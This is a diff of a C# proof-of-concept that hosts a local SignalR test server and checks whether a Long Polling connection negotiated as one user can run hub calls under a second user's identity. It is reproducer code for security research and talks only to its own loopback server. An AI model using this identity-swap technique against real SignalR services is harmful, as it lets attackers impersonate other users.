@@ -1,4 +1,3 @@
-using System.Net;
 using System.Net.Http.Headers;
 using System.Security.Claims;
 using System.Text;
@@ -10,8 +9,8 @@ using Microsoft.AspNetCore.SignalR;
 var builder = WebApplication.CreateBuilder(args);
 builder.WebHost.UseUrls("http://127.0.0.1:0");
 builder.Services.AddSignalR();
-
 var app = builder.Build();
+
 app.Use(async (context, next) =>
 {
     var testUser = context.Request.Headers["X-Test-User"].ToString();
@@ -19,9 +18,7 @@ app.Use(async (context, next) =>
     {
         var identity = new ClaimsIdentity(
             new[] { new Claim(ClaimTypes.Name, testUser) },
-            authenticationType: "LocalSignalRPoC",
-            nameType: ClaimTypes.Name,
-            roleType: ClaimTypes.Role);
+            "LocalSignalRPoC", ClaimTypes.Name, ClaimTypes.Role);
         context.User = new ClaimsPrincipal(identity);
     }
     await next();
@@ -29,34 +26,27 @@ app.Use(async (context, next) =>
 
 app.MapHub<IdentityProbeHub>("/probe");
 await app.StartAsync();
-
 try
 {
     var server = app.Services.GetRequiredService<IServer>();
-    var addresses = server.Features.Get<IServerAddressesFeature>()
-        ?? throw new InvalidOperationException("Kestrel address feature unavailable.");
-    var address = addresses.Addresses.Single();
+    var address = server.Features.Get<IServerAddressesFeature>()!.Addresses.Single();
     using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(25) };
-
     Console.WriteLine($"Local test server: {address}");
     Console.WriteLine($"Runtime: {System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription}");
 
     var control = await RunScenario(client, address, "Alice", "Alice", "Alice");
-    Console.WriteLine($"CONTROL same identity: {control.Status}; Hub saw: {control.Identity ?? "<none>"}");
+    Console.WriteLine($"CONTROL: {control.Status}; Hub saw: {control.Identity ?? "<none>"}; {control.Detail}");
     if (control.Status != ScenarioStatus.Completed || control.Identity != "Alice")
     {
-        Console.WriteLine($"INCONCLUSIVE: positive control failed. {control.Detail}");
+        Console.WriteLine("INCONCLUSIVE: positive control failed; cross-identity case not run.");
         Environment.ExitCode = 2;
         return;
     }
 
     var candidate = await RunScenario(client, address, "Alice", "Alice", "Bob");
-    Console.WriteLine($"CROSS-IDENTITY: {candidate.Status}; Hub saw: {candidate.Identity ?? "<none>"}");
+    Console.WriteLine($"CROSS-IDENTITY: {candidate.Status}; Hub saw: {candidate.Identity ?? "<none>"}; {candidate.Detail}");
     if (candidate.Status == ScenarioStatus.Completed && candidate.Identity == "Bob")
-    {
-        Console.WriteLine("VULNERABILITY_REPRODUCED: Hub invocation executed as the attaching identity Bob.");
-        Environment.ExitCode = 0;
-    }
+        Console.WriteLine("VULNERABILITY_REPRODUCED: Hub invocation executed as attaching identity Bob.");
     else if (candidate.Status == ScenarioStatus.Completed)
     {
         Console.WriteLine($"NOT_REPRODUCED: Hub observed '{candidate.Identity ?? "<anonymous>"}', not Bob.");
@@ -64,103 +54,83 @@ try
     }
     else
     {
-        Console.WriteLine($"INCONCLUSIVE: cross-identity scenario did not complete. {candidate.Detail}");
+        Console.WriteLine("INCONCLUSIVE: cross-identity invocation did not complete.");
         Environment.ExitCode = 2;
     }
 }
-finally
-{
-    await app.StopAsync();
-}
+finally { await app.StopAsync(); }
 
-static async Task<ScenarioResult> RunScenario(
-    HttpClient client, string baseAddress,
+static async Task<ScenarioResult> RunScenario(HttpClient client, string address,
     string negotiateIdentity, string sendIdentity, string attachIdentity)
 {
-    var root = baseAddress.TrimEnd('/');
+    var root = address.TrimEnd('/');
     using var negotiate = new HttpRequestMessage(HttpMethod.Post, $"{root}/probe/negotiate?negotiateVersion=1");
     negotiate.Headers.Add("X-Test-User", negotiateIdentity);
-    using var negotiateResponse = await client.SendAsync(negotiate);
-    var negotiateBody = await negotiateResponse.Content.ReadAsStringAsync();
-    if (!negotiateResponse.IsSuccessStatusCode)
-        return new(ScenarioStatus.Rejected, null, $"Negotiate HTTP {(int)negotiateResponse.StatusCode}: {negotiateBody}");
+    using var nr = await client.SendAsync(negotiate);
+    var nb = await nr.Content.ReadAsStringAsync();
+    if (!nr.IsSuccessStatusCode) return new(ScenarioStatus.Rejected, null, $"negotiate {(int)nr.StatusCode}: {nb}");
+    using var json = JsonDocument.Parse(nb);
+    var token = json.RootElement.GetProperty("connectionToken").GetString();
+    if (string.IsNullOrWhiteSpace(token)) return new(ScenarioStatus.Rejected, null, "empty connectionToken");
+    var url = $"{root}/probe?id={Uri.EscapeDataString(token)}";
 
-    using var json = JsonDocument.Parse(negotiateBody);
-    if (!json.RootElement.TryGetProperty("connectionToken", out var tokenElement))
-        return new(ScenarioStatus.Rejected, null, "Missing connectionToken.");
-    var token = tokenElement.GetString();
-    if (string.IsNullOrWhiteSpace(token))
-        return new(ScenarioStatus.Rejected, null, "Empty connectionToken.");
+    // First Long Polling GET attaches the transport.
+    using var firstGet = new HttpRequestMessage(HttpMethod.Get, url);
+    firstGet.Headers.Add("X-Test-User", attachIdentity);
+    using var firstResponse = await client.SendAsync(firstGet);
+    var firstBody = await firstResponse.Content.ReadAsStringAsync();
+    if (!firstResponse.IsSuccessStatusCode) return new(ScenarioStatus.Rejected, null, $"attach GET {(int)firstResponse.StatusCode}: {firstBody}");
 
-    // A Long Polling transport is attached by its first GET. It may return
-    // immediately with an empty response; that is normal and not a held poll.
-    using (var attach = new HttpRequestMessage(HttpMethod.Get, $"{root}/probe?id={Uri.EscapeDataString(token)}"))
+    // Send the SignalR handshake alone. The server's "{}<RS>" response is
+    // delivered by a subsequent Long Polling GET.
+    using var handshake = new HttpRequestMessage(HttpMethod.Post, url);
+    handshake.Headers.Add("X-Test-User", sendIdentity);
+    handshake.Content = new ByteArrayContent(Encoding.UTF8.GetBytes("{\"protocol\":\"json\",\"version\":1}\u001e"));
+    handshake.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
+    using var hr = await client.SendAsync(handshake);
+    var hb = await hr.Content.ReadAsStringAsync();
+    if (!hr.IsSuccessStatusCode) return new(ScenarioStatus.Rejected, null, $"handshake POST {(int)hr.StatusCode}: {hb}");
+
+    var handshakePoll = await Poll(client, url, attachIdentity);
+    if (!handshakePoll.Success) return new(ScenarioStatus.Rejected, null, $"handshake poll failed: {handshakePoll.Body}");
+    if (!handshakePoll.Body.Contains("{}", StringComparison.Ordinal))
+        return new(ScenarioStatus.NoCompletion, null, $"expected handshake ack, got: {handshakePoll.Body}");
+
+    // Only after the handshake acknowledgement send the Hub invocation.
+    using var invoke = new HttpRequestMessage(HttpMethod.Post, url);
+    invoke.Headers.Add("X-Test-User", sendIdentity);
+    invoke.Content = new ByteArrayContent(Encoding.UTF8.GetBytes(
+        "{\"type\":1,\"invocationId\":\"identity-check-1\",\"target\":\"WhoAmI\",\"arguments\":[]}\u001e"));
+    invoke.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
+    using var ir = await client.SendAsync(invoke);
+    var ib = await ir.Content.ReadAsStringAsync();
+    if (!ir.IsSuccessStatusCode) return new(ScenarioStatus.Rejected, null, $"invocation POST {(int)ir.StatusCode}: {ib}");
+
+    var response = await Poll(client, url, attachIdentity);
+    if (!response.Success) return new(ScenarioStatus.Rejected, null, $"invocation poll failed: {response.Body}");
+    foreach (var frame in response.Body.Split('\u001e', StringSplitOptions.RemoveEmptyEntries))
     {
-        attach.Headers.Add("X-Test-User", attachIdentity);
-        using var attachResponse = await client.SendAsync(attach);
-        if (!attachResponse.IsSuccessStatusCode)
-            return new(ScenarioStatus.Rejected, null, $"Initial attach HTTP {(int)attachResponse.StatusCode}: {await attachResponse.Content.ReadAsStringAsync()}");
+        using var msg = JsonDocument.Parse(frame);
+        var obj = msg.RootElement;
+        if (obj.TryGetProperty("type", out var type) && type.GetInt32() == 3 &&
+            obj.TryGetProperty("invocationId", out var id) && id.GetString() == "identity-check-1" &&
+            obj.TryGetProperty("result", out var result))
+            return new(ScenarioStatus.Completed, result.GetString(), null);
     }
+    return new(ScenarioStatus.NoCompletion, null, $"no invocation completion: {response.Body}");
+}
 
-    const char rs = '\u001e';
-    var frames = "{\"protocol\":\"json\",\"version\":1}" + rs +
-                 "{\"type\":1,\"invocationId\":\"identity-check-1\",\"target\":\"WhoAmI\",\"arguments\":[]}" + rs;
-    using (var send = new HttpRequestMessage(HttpMethod.Post, $"{root}/probe?id={Uri.EscapeDataString(token)}"))
-    {
-        send.Headers.Add("X-Test-User", sendIdentity);
-        send.Content = new ByteArrayContent(Encoding.UTF8.GetBytes(frames));
-        send.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
-        using var sendResponse = await client.SendAsync(send);
-        var body = await sendResponse.Content.ReadAsStringAsync();
-        if (!sendResponse.IsSuccessStatusCode)
-            return new(ScenarioStatus.Rejected, null, $"Send HTTP {(int)sendResponse.StatusCode}: {body}");
-    }
-
-    // Handshake response and invocation completion can arrive in separate
-    // Long Polling responses. Keep polling until the matching completion or
-    // a bounded timeout; do not mistake the 3-byte '{}<RS>' handshake for it.
-    var deadline = DateTime.UtcNow.AddSeconds(10);
-    var observed = new List<string>();
-    while (DateTime.UtcNow < deadline)
-    {
-        using var poll = new HttpRequestMessage(HttpMethod.Get, $"{root}/probe?id={Uri.EscapeDataString(token)}");
-        poll.Headers.Add("X-Test-User", attachIdentity);
-        using var response = await client.SendAsync(poll);
-        var body = await response.Content.ReadAsStringAsync();
-        if (!response.IsSuccessStatusCode)
-            return new(ScenarioStatus.Rejected, null, $"Receive poll HTTP {(int)response.StatusCode}: {body}");
-        if (body.Length == 0)
-        {
-            await Task.Delay(50);
-            continue;
-        }
-
-        observed.Add(body);
-        foreach (var frame in body.Split(rs, StringSplitOptions.RemoveEmptyEntries))
-        {
-            try
-            {
-                using var message = JsonDocument.Parse(frame);
-                var obj = message.RootElement;
-                if (obj.TryGetProperty("type", out var type) && type.GetInt32() == 3 &&
-                    obj.TryGetProperty("invocationId", out var id) && id.GetString() == "identity-check-1" &&
-                    obj.TryGetProperty("result", out var result))
-                    return new(ScenarioStatus.Completed, result.GetString(), null);
-                if (obj.TryGetProperty("type", out type) && type.GetInt32() == 7)
-                    return new(ScenarioStatus.Rejected, null, $"Hub close frame: {frame}");
-            }
-            catch (JsonException) { }
-        }
-    }
-
-    var diagnostic = string.Join(" | ", observed.Select(x => x.Replace(rs, '|')));
-    return new(ScenarioStatus.NoCompletion, null, $"No invocation completion within 10s. Poll payloads: {diagnostic}");
+static async Task<(bool Success, string Body)> Poll(HttpClient client, string url, string identity)
+{
+    using var get = new HttpRequestMessage(HttpMethod.Get, url);
+    get.Headers.Add("X-Test-User", identity);
+    using var response = await client.SendAsync(get);
+    return (response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync());
 }
 
 public sealed class IdentityProbeHub : Hub
 {
     public string WhoAmI() => Context.User?.Identity?.Name ?? "<anonymous>";
 }
-
 public enum ScenarioStatus { Completed, Rejected, NoCompletion }
 public sealed record ScenarioResult(ScenarioStatus Status, string? Identity, string? Detail);
